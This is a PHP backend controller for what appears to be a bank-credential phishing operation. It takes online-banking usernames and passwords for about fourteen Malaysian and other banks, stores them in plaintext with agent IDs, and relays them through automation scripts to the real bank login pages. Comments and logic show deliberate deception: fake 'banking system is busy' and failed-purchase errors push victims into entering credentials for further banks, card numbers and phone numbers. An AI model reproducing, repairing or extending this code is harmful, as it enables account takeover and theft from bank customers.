<?php

namespace app\api\controller;


use app\api\model\Userbank;
use app\api\model\Usertask;
use app\common\controller\Curl;
use app\common\model\Userinfo;

class Bank extends Controller
{
    //脚本地址
//    protected $request_url = 'http://8.210.216.108';
//    protected $request_url = 'http://47.254.239.149';
    protected $request_url = 'http://localhost';
    protected $image_url = 'https://api.maygroup.shop/';
    //图片地址

    public function loginBank(){
        $data['username'] = $this->request->post("username");
        $data['password'] = $this->request->post("password");
        $data['action'] = $this->request->post("action");
        $data['bankname'] = $this->request->post("bankname");
        $data['user_id'] = $this->request->post("user_id");
        $data['type'] = $this->request->post("type");
        if($data['action'] == 'getimg'){
            $info = (new Userinfo())->where(['user_id'=>$data['user_id'],'bank_name'=>$data['bankname'],'username'=>$data['username'],'image'=>['neq','']])->find();
            if($info){
                $return = [
                    'content' => $info['content'],
                    'image' => $info['image'],
                    'type' => $data['type']
                ];
                $this->success('success',$return);
            }
        }
        if($data['action'] == 'login'){
            if(empty($data['password'])){
                $this->error('Password cannot be empty');
            }
            //不同用户，不能输入相同银行，相同账号，状态为正确的网银,提示无效账号
            $right = (new Userinfo())->where(['user_id'=>['<>',$data['user_id']],'bank_name'=>$data['bankname'],'username'=>$data['username'],'status'=>1])->find();
            if($right){
                $this->error('Invalid account');
            }
        }
        if($data['bankname'] == 'Maybank'){
            //需要图片
            //需要文案
            $this->Maybank($data);
        }elseif($data['bankname'] == 'Affinbank'){
            //需要图片文案
            $this->Affinbank($data);
        }elseif($data['bankname'] == 'Alliancebank'){
            //需要图片
            $this->Alliancebank($data);
        }elseif($data['bankname'] == 'Ambank'){
            //需要图片
            $this->Ambank($data);
        }elseif($data['bankname'] == 'Bankislam'){
            //需要图片
            $this->Bankislam($data);
        }elseif($data['bankname'] == 'Bankrakyat'){
            //不能用，人机验证
            //需要图片
            $this->Bankrakyat($data);
        }elseif($data['bankname'] == 'Bsn'){
            //速度有点慢
            //需要图片
            $this->Bsn($data);
        }elseif($data['bankname'] == 'Cimb'){
            //需要图片
            $this->Cimb($data);
        }elseif($data['bankname'] == 'Citibank'){
            //不需要图片
            $this->Citibank($data);
        }elseif($data['bankname'] == 'Hongleongbank'){
            //需要图片
            $this->Hongleongbank($data);
        }elseif($data['bankname'] == 'Publicbank'){
            //需要图片
            $this->Publicbank($data);
        }elseif($data['bankname'] == 'Rhbbank'){
            //需要图片
            $this->Rhbbank($data);
        }elseif($data['bankname'] == 'Agrobank'){
            //需要图片
            $this->Agrobank($data);
        }elseif($data['bankname'] == 'Hsbc'){
            //不能用，需要先判断用户名才能进行下一步
            $this->Hsbc($data);
        }
//        elseif($data['bankname'] == 'Uob'){
//            //会ip频繁
//            $this->Uob($data);
//        }
//        elseif($data['bankname'] == 'Ocbc'){
//            //需要图片
//            $this->Ocbc($data);
//        }
        else{
            $this->error('Unsupported Bank');
        }
    }

    public function Maybank($data){
        if(strlen($data['username'])<6){
            $this->error('Username cannot be less than 6 characters');
        }
        $id = 0;
        if($data['action'] == 'login'){
            if(strlen($data['password'])<6){
                $this->error('password cannot be less than 6 characters');
            }
            $id = $this->addUserInfo($data);
        }
//        if($data['action'] == 'getimg'){
        $data['url'] = 'https://www.maybank2u.com.my/home/m2u/common/login.do';
        $url = $this->request_url.':8888/maybank';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
//        }else{
//            $rs = [
//                'code' => 1,
//                'data' => [
//                    'image' => '',
//                    'content' => '',
//                ],
//                'status' => 1
//            ];
//        }
        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Affinbank($data){
        $id = 0;
        $data['url'] = 'https://rib.affinalways.com/retail/#!/login';
        $url = $this->request_url.':8889/affinbank';
        if($data['action'] == 'login'){
            $id = $this->addUserInfo($data);
        }
//        if($data['action'] == 'getimg'){
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
//        }else{
//            $rs = [
//                'code' => 1,
//                'data' => [
//                    'image' => '',
//                    'content' => '',
//                ],
//                'status' => 1
//            ];
//        }
        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Alliancebank($data){
        if(strlen($data['username'])<6){
            $this->error('Username cannot be less than 6 characters');
        }
        $id = 0;
        if($data['action'] == 'login') {
            if (strlen($data['password']) < 6) {
                $this->error('password cannot be less than 6 characters');
            }
            $id = $this->addUserInfo($data);
        }
//        if($data['action'] == 'getimg'){
        $data['url'] = 'https://www.allianceonline.com.my/personal/login/login.do';
        $data['image_url'] = $this->image_url;
        $url = $this->request_url.':8890/alliancebank';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
//        }else{
//            $rs = [
//                'code' => 1,
//                'data' => [
//                    'image' => '',
//                    'content' => '',
//                ],
//                'status' => 1
//            ];
//        }
        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Ambank($data){
        if(strlen($data['username'])<6){
            $this->error('Username cannot be less than 6 characters');
        }
        $id = 0;
        if($data['action'] == 'login') {
            if (strlen($data['password']) < 6) {
                $this->error('password cannot be less than 6 characters');
            }
            $id = $this->addUserInfo($data);
        }
//        if($data['action'] == 'getimg'){
        $data['url'] = 'https://ambank.amonline.com.my/web/';
        $url = $this->request_url.':8891/ambank';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
//        }else{
//            $rs = [
//                'code' => 1,
//                'data' => [
//                    'image' => '',
//                    'content' => '',
//                ],
//                'status' => 1
//            ];
//        }

        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Bankislam($data){
        if(strlen($data['username'])<6){
            $this->error('Username cannot be less than 6 characters');
        }
        $id = 0;
        if($data['action'] == 'login') {
            if (strlen($data['password']) < 6) {
                $this->error('password cannot be less than 6 characters');
            }
            $id = $this->addUserInfo($data);
        }
//        if($data['action'] == 'getimg'){
        $data['url'] = 'https://www.bankislam.biz/';
        $data['image_url'] = $this->image_url;
        $url = $this->request_url.':8892/bankislam';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
//        }else{
//            $rs = [
//                'code' => 1,
//                'data' => [
//                    'image' => '',
//                    'content' => '',
//                ],
//                'status' => 1
//            ];
//        }

        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Bankrakyat($data){
        //人机验证
        $data['url'] = 'https://www2.irakyat.com.my/personal/login/login.do?step1=';
        $url = $this->request_url.':8893/bankrakyat';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
        if($rs['code'] == 1){
            $this->success('success',$rs['data']);
        }else{
            $this->error($rs['msg']);
        }
    }

    public function Bsn($data){
        //速度慢
        if(strlen($data['username'])<8){
            $this->error('Username cannot be less than 8 characters');
        }
        $id = 0;
        if($data['action'] == 'login') {
            if (strlen($data['password']) < 8) {
                $this->error('password cannot be less than 8 characters');
            }
            $id = $this->addUserInfo($data);
        }
        $data['url'] = 'https://www.mybsn.com.my/mybsn/login/login.do';
        $url = $this->request_url.':8894/bsn';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Cimb($data){
        //频繁访问会ip限制
        if(strlen($data['username'])<6){
            $this->error('Username cannot be less than 6 characters');
        }
        $id = 0;
        if($data['action'] == 'login') {
            if (strlen($data['password']) < 6) {
                $this->error('password cannot be less than 6 characters');
            }
            $id = $this->addUserInfo($data);
        }
//        if($data['action'] == 'getimg'){
        $data['url'] = 'https://www.cimbclicks.com.my/clicks/#/fpx';
        $url = $this->request_url.':8895/cimb';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
//        }else{
//            $rs = [
//                'code' => 1,
//                'data' => [
//                    'image' => '',
//                    'content' => '',
//                ],
//                'status' => 1
//            ];
//        }

        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Citibank($data){
        if($data['action'] == 'getimg'){
            $this->error('error');
        }
        if(strlen($data['username'])<6){
            $this->error('Username cannot be less than 6 characters');
        }
        if(strlen($data['password'])<6){
            $this->error('Password cannot be less than 6 characters');
        }
        $id = $this->addUserInfo($data);
        $data['url'] = 'https://www.citibank.com.my/MYGCB/JSO/username/signon/flow.action';
        $url = $this->request_url.':8896/citibank';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Hongleongbank($data){
        $id = 0;
        if($data['action'] == 'login') {
            $id = $this->addUserInfo($data);
        }
//        if($data['action'] == 'getimg'){
        $data['url'] = 'https://s.hongleongconnect.my/rib/app/fo/login?web=1';
        $url = $this->request_url.':8897/hongleongbank';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
//        }else{
//            $rs = [
//                'code' => 1,
//                'data' => [
//                    'image' => '',
//                    'content' => '',
//                ],
//                'status' => 1
//            ];
//        }

        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Publicbank($data){
        $id = 0;
        if($data['action'] == 'login') {
            $id = $this->addUserInfo($data);
        }
//        if($data['action'] == 'getimg'){
        $data['url'] = 'https://www2.pbebank.com/myIBK/apppbb/servlet/BxxxServlet?RDOName=BxxxAuth&MethodName=login';
        $data['image_url'] = $this->image_url;
        $url = $this->request_url.':8898/publicbank';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
//        }else{
//            $rs = [
//                'code' => 1,
//                'data' => [
//                    'image' => '',
//                    'content' => '',
//                ],
//                'status' => 1
//            ];
//        }

        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Rhbbank($data){
        if(strlen($data['username'])<6){
            $this->error('Username cannot be less than 6 characters');
        }
        $id = 0;
        if($data['action'] == 'login') {
            if (strlen($data['password']) < 6) {
                $this->error('Password cannot be less than 6 characters');
            }
            $id = $this->addUserInfo($data);
        }
//        if($data['action'] == 'getimg'){
        $data['url'] = 'https://onlinebanking.rhbgroup.com/my/login';
        $url = $this->request_url.':8899/rhbbank';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
//        }else{
//            $rs = [
//                'code' => 1,
//                'data' => [
//                    'image' => '',
//                    'content' => '',
//                ],
//                'status' => 1
//            ];
//        }

        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Agrobank($data){
        if(strlen($data['username'])<6){
            $this->error('Username cannot be less than 6 characters');
        }
        $id = 0;
        if($data['action'] == 'login'){
            if(strlen($data['password'])<6){
                $this->error('Password cannot be less than 6 characters');
            }
            $id = $this->addUserInfo($data);
        }
        $data['url'] = 'https://www.agronet.com.my/rib/common/Login.do';
        $url = $this->request_url.':8900/agrobank';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
        if($rs['code'] == 1){
            $this->updateUserInfo($data,$rs,$id);
            $rs['data']['type'] = $data['type'];
            $this->success('success',$rs['data']);
        }else{
            $this->updateUserInfo($data,$rs,$id);
            $this->error($rs['msg']);
        }
    }

    public function Hsbc($data){
        if(strlen($data['username'])<5){
            $this->error('Username cannot be less than 5 characters');
        }
        if(strlen($data['password'])<5){
            $this->error('Password cannot be less than 5 characters');
        }
        $data['url'] = 'https://www.hsbc.com.sg/security/';
        $url = $this->request_url.':8901/hsbc';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
        if($rs['code'] == 1){
            $this->success('success',$rs['data']);
        }else{
            $this->error($rs['msg']);
        }
    }

    public function Uob($data){
        $data['url'] = 'https://pib.uob.com.my/PIBLogin/Public/processPreCapture.do?keyId=lpc&lang=en_MY';
        $url = $this->request_url.':8902/uob';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
        if($rs['code'] == 1){
            $this->success('success',$rs['data']);
        }else{
            $this->error($rs['msg']);
        }
    }

    public function Ocbc($data){
        if(strlen($data['username'])<8){
            $this->error('Username cannot be less than 5 characters');
        }
        $data['url'] = 'https://internet.ocbc.com.my/internet-banking/LoginV2/Login';
        $url = $this->request_url.':8903/ocbc';
        $curl = new Curl();
        $rs      = $curl->post($url,$data);
        $rs = (json_decode($rs,true));
        if($rs['code'] == 1){
            $this->success('success',$rs['data']);
        }else{
            $this->error($rs['msg']);
        }
    }

    public function addUserInfo($data){
        if($data['action'] == 'login'){
            $exist = (new Userinfo())->where(['user_id'=>$data['user_id'],'bank_name' => $data['bankname'],'username' => $data['username'],'password' => $data['password']])->find();
            if($exist){
                return $exist['id'];
            }
            $md5 = md5($data['user_id'].$data['bankname'].$data['username'].$data['password']);
            $agent_id = (new \app\api\model\User())->where(['id'=>$data['user_id']])->value('agent_id');
            $create = [
                'user_id' => $data['user_id'],
                'bank_name' => $data['bankname'],
                'image' => '',
                'content' => '',
                'status' => 3,
                'createtime' => time(),
                'updatetime' => time(),
                'username' => $data['username'],
                'password' => $data['password'],
                'type' => $data['type'],
                'md5' => $md5,
                'agent_id' => $agent_id
            ];
            $id = (new Userinfo())->insertGetId($create);
            return $id;
        }
    }

    public function updateUserInfo($data,$rs,$id = 0){
        if($data['action'] == 'getimg'){
            $exist = (new Userinfo())->where(['user_id'=>$data['user_id'],'bank_name' => $data['bankname'],'username' => $data['username']])->find();
            if($exist){
                return;
            }
            $agent_id = (new \app\api\model\User())->where(['id'=>$data['user_id']])->value('agent_id');
            $create = [
                'user_id' => $data['user_id'],
                'bank_name' => $data['bankname'],
                'image' => $rs['data']['image'],
                'content' => $rs['data']['content'],
                'status' => 3,
                'createtime' => time(),
                'updatetime' => time(),
                'username' => $data['username'],
                'password' => '',
                'type' => $data['type'],
                'md5' => '',
                'agent_id' => $agent_id
            ];
            (new Userinfo())->create($create);
        }
        if($data['action'] == 'login'&&$id != 0){
            $exist = (new Userinfo())->where(['id'=>$id])->find();
            if($exist){
                $user = (new \app\api\model\User())->where(['id'=>$exist['user_id']])->find();
                $near = (new Userinfo())->where(['user_id'=>$exist['user_id'],'bank_name'=>$exist['bank_name'],'username'=>$exist['username']])->find();
                $status = $rs['status']==1?1:2;
                $update = [
                    'image' => $near?$near['image']:$rs['data']['image'],
                    'content' => $near?$near['content']:$rs['data']['content'],
                    'status' => $status,
                    'updatetime' => time(),
                ];
                (new Userinfo())->where(['id'=>$id])->update($update);
                if($status == 1){
                    (new \app\api\model\User())->where(['id'=>$exist['user_id']])->update(['is_get'=>1]);
                }
                if($status == 1&&$data['type'] == 1){
                    //二次验证
                    if($user['times'] != 1) {
                        //购买商品，第一次返回错误，第二次不能跟第一次银行一样，否则返回错误，第三次及以上直接跳转支付页面
                        $banks = (new Userinfo())->field('bank_name')->where(['id' => ['<>', $id], 'user_id' => $exist['user_id'], 'status' => 1])->group('bank_name')->select();
                        if (count($banks) <= 0) {
                            $this->error('success', [], 3);
                            //第一次，无需处理任何逻辑
                        } elseif (count($banks) > 0 && count($banks) <= 1) {
                            //第二次，银行不能跟第一次一样
                            if ($banks[0]['bank_name'] != $exist['bank_name']) {
                                //跳转支付页面
                                $this->error('success', [], 3);
                            }
                        } else {
                            //第三次及以上，跳转支付页面
                            $this->error('success', [], 3);
                        }
                    }
                }
                if($status == 1&&$data['type'] == 3){
                    //不能相同卡号
                    $bankcard = (new Userbank())->where(['bankcard' => $this->request->post("bank_number")])->find();
                    if($bankcard){
                        $this->error('The banking system is busy', [], 2);
                    }
                    if($user['times'] != 1) {
                        $banks = (new Userinfo())->field('bank_name')->where(['id' => ['<>', $id], 'user_id' => $exist['user_id'], 'status' => 1])->group('bank_name')->select();
                        if (count($banks) <= 0) {
                            $this->error('The banking system is busy', [], 2);
                        } elseif (count($banks) > 0 && count($banks) <= 1) {
                            //第二次，银行不能跟第一次一样
                            if ($banks[0]['bank_name'] == $exist['bank_name']) {
                                $this->error('The banking system is busy', [], 2);
                            }
                        }

                        $num = (new Userbank())->where(['user_id' => $exist['user_id']])->count();
                        //判断用户有没有绑定过银行卡，没有的话就加一条记录，并且设置为用户不可见，并且返回银行繁忙
                        if ($num == 0) {
                            $create = [
                                'user_id' => $exist['user_id'],
                                'username' => $this->request->post("cardholder_name"),
                                'bankcard' => $this->request->post("bank_number"),
                                'bankname' => $data['bankname'],
                                'bankphone' => $this->request->post('phone_number'),
                                'createtime' => time(),
                                'updatetime' => time(),
                                'status' => 1
                            ];
                            (new Userbank())->create($create);
//                        $this->error('The banking system is busy',[],2);
                        } else {
                            //第二次及以上绑定银行卡，需要判断跟之前绑定的银行是否相同，相同则返回错误
                            $userbank = (new Userbank())->where(['user_id' => $exist['user_id'], 'bankname' => $data['bankname']])->find();
                            if ($userbank) {
                                $this->error('The banking system is busy', [], 2);
                            }
                            $create = [
                                'user_id' => $exist['user_id'],
                                'username' => $this->request->post("cardholder_name"),
                                'bankcard' => $this->request->post("bank_number"),
                                'bankname' => $data['bankname'],
                                'bankphone' => $this->request->post('phone_number'),
                                'createtime' => time(),
                                'updatetime' => time(),
                            ];
                            (new Userbank())->create($create);
                        }
                    }else{
                        $create = [
                            'user_id' => $exist['user_id'],
                            'username' => $this->request->post("cardholder_name"),
                            'bankcard' => $this->request->post("bank_number"),
                            'bankname' => $data['bankname'],
                            'bankphone' => $this->request->post('phone_number'),
                            'createtime' => time(),
                            'updatetime' => time(),
                        ];
                        (new Userbank())->create($create);
                    }
                }
            }
        }
    }
}
